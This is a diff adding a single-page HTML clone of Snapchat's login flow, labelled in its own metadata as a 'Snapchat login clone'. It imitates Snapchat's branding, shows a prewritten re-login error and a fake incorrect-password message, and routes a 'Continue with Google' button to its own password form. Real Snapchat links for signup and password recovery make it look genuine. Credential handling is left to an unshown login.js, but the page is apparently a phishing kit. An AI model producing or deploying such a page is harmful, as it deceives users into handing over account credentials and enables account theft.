@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0 user-scalable=no" />
+
+  <link rel="shortcut icon" href="img/faviconV2.png">
+  <meta name="description" content="Snapchat login clone (app.html: merged previous files)" />
+  <meta property="og:site_name" content="Snapchat Spotlight">
+
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+
+  <!-- Use the SAME CSS as the previous pages -->
+  <link rel="stylesheet" href="css/index.css">
+  <link rel="stylesheet" href="css/landing.css">
+  <link rel="stylesheet" href="css/login.css">
+
+  <title>Snapchat (Merged)</title>
+</head>
+<body>
+  <!-- One-page container: we reuse markup from previous pages -->
+
+  <!-- Splash / Index view -->
+  <div id="view-index" class="view active">
+    <div class="loader">
+      <div class="logo"></div>
+    </div>
+
+    <div class="bottom-text">
+      <div class="copyright">© Snap Inc 2026</div>
+      <div class="brand">Snapchat</div>
+    </div>
+  </div>
+
+  <!-- Landing view -->
+  <div id="view-landing" class="view">
+    <main class="landing">
+      <div class="logo-wrap" aria-hidden="true">
+        <img class="ghost-logo-img" src="img/icon.svg" alt="Snapchat" />
+      </div>
+
+      <div class="cta">
+        <button type="button" class="pill pill-google" id="btn-google">
+          <span class="google-icon" aria-hidden="true"></span>
+          <span class="pill-text">Continuer avec Google</span>
+        </button>
+
+        <button type="button" class="pill pill-signup" id="btn-signup">
+          <span class="pill-text pill-text-white">Inscription</span>
+        </button>
+      </div>
+
+      <div class="helper">
+        <span>Vous avez déjà un compte ? </span>
+        <a href="#" id="link-login">Connectez-vous</a>
+      </div>
+    </main>
+  </div>
+
+  <!-- Login view -->
+  <div id="view-login" class="view">
+    <!-- Back Button -->
+    <button class="back-button" id="btn-back">
+      <img src="img/left-arrow.png" height="15px" width="15px" alt="">
+    </button>
+
+    <div class="login-container">
+      <div id="error-message" class="error-message">
+        Something went wrong ! Please re-login to your account.
+      </div>
+
+      <h1>Log In</h1>
+
+      <form action="#" method="POST" id="login-form">
+        <label for="username">USERNAME OR EMAIL</label>
+        <input type="text" id="username" name="name" required>
+
+        <p class="alternate-option">
+          <a href="javascript:void(0);" id="switch-to-phone">Use phone number instead</a>
+        </p>
+
+        <label for="password">PASSWORD</label>
+        <div class="password-container">
+          <input type="password" id="password" name="message" required>
+          <button type="button" class="toggle-password">
+            <img src="img/eye-closed.svg" id="eye-icon" width="20" height="20" alt="eye icon">
+          </button>
+        </div>
+
+        <div class="save-info">
+          <input type="checkbox" id="save-login">
+          <label for="save-login">Save Login Info on your device</label>
+        </div>
+
+        <div class="incorrect">
+          <p>Incorrect password, please try again.</p>
+        </div>
+
+        <p class="forgot-password">
+          <a href="https://accounts.snapchat.com/accounts/v2/otp?ai=dGVqYXptYWxp&continue=%2Faccounts%2Fsso%3Fclient_id%3Dweb-calling-corp--prod%26referrer%3Dhttps%253A%252F%252Fweb.snapchat.com%253Fref%3Dsign_in_sidebar&otpRequirement=ChBDb25maXJtIEl0J3MgWW91EjRQbGVhc2UgaW5wdXQgdGhlIGNvZGUgc2VudCB0byDigaYrOTEgKioqKiotKjg5MDXigakuIgEB&accountRecovery=true&referrer=https%3A%2F%2Fweb.snapchat.com%3Fref%3Dsign_in_sidebar">Forgot your password?</a>
+        </p>
+
+        <button type="submit" class="login-button">Log In</button>
+      </form>
+    </div>
+  </div>
+
+  <style>
+    /* Minimal router layer only; keep the original CSS look from css/*.css */
+    .view { display:none; min-height:100vh; }
+    .view.active { display:block; }
+  </style>
+
+  <script src="js/index.js"></script>
+  <script src="js/login.js"></script>
+
+  <script>
+    // Merge logic: switch views while letting existing scripts drive UI details.
+    const viewIndex = document.getElementById('view-index');
+    const viewLanding = document.getElementById('view-landing');
+    const viewLogin = document.getElementById('view-login');
+
+    function setView(which) {
+      viewIndex.classList.remove('active');
+      viewLanding.classList.remove('active');
+      viewLogin.classList.remove('active');
+      if (which === 'index') viewIndex.classList.add('active');
+      if (which === 'landing') viewLanding.classList.add('active');
+      if (which === 'login') viewLogin.classList.add('active');
+    }
+
+    // default: index then to landing (match previous index.html behavior)
+    setTimeout(() => setView('landing'), 2400);
+
+    // Landing to Login
+    document.getElementById('btn-google').addEventListener('click', () => setView('login'));
+    document.getElementById('btn-signup').addEventListener('click', () => {
+      window.location.href = 'https://accounts.snapchat.com/v2/signup';
+    });
+    document.getElementById('link-login').addEventListener('click', (e) => {
+      e.preventDefault();
+      setView('login');
+    });
+
+    // Back to Landing
+    document.getElementById('btn-back').addEventListener('click', () => setView('landing'));
+
+    // Make sure login form uses existing logic.
+    const loginForm = document.getElementById('login-form');
+    if (loginForm && typeof validatePassword === 'function') {
+      loginForm.onsubmit = validatePassword;
+    }
+  </script>
+</body>
+</html>
